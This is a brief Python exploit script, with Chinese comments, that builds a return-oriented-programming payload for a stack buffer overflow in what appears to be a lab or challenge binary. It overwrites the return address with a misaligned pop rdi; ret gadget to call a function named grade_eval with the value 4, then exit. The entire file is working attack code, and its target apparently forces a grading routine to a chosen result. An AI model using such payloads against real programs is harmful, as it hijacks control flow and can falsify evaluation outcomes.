#!/usr/bin/env python3
# ROP：栈不能执行，只能拿 .text 里现成的小片段拼
# objdump 里翻了一圈没看到 pop rdi; ret，后来发现 0x401a32 是 pop r15（41 5f），
# 从它第二个字节 0x401a33 开始，5f 就是 pop rdi，后面的 c3 正好是 ret
import sys
import struct

payload = b"A" * 16                             # expression
payload += b"B" * 8                             # saved rbp，随便填
payload += struct.pack("<Q", 0x401a33)          # pop rdi; ret
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", 0x401978)          # grade_eval
payload += struct.pack("<Q", 0x401a33)          # grade_eval 返回后再 pop 一次，给 exit 传参
payload += struct.pack("<Q", 0)
payload += struct.pack("<Q", 0x4016e0)          # exit@plt
payload += b"\n"

sys.stdout.buffer.write(payload)
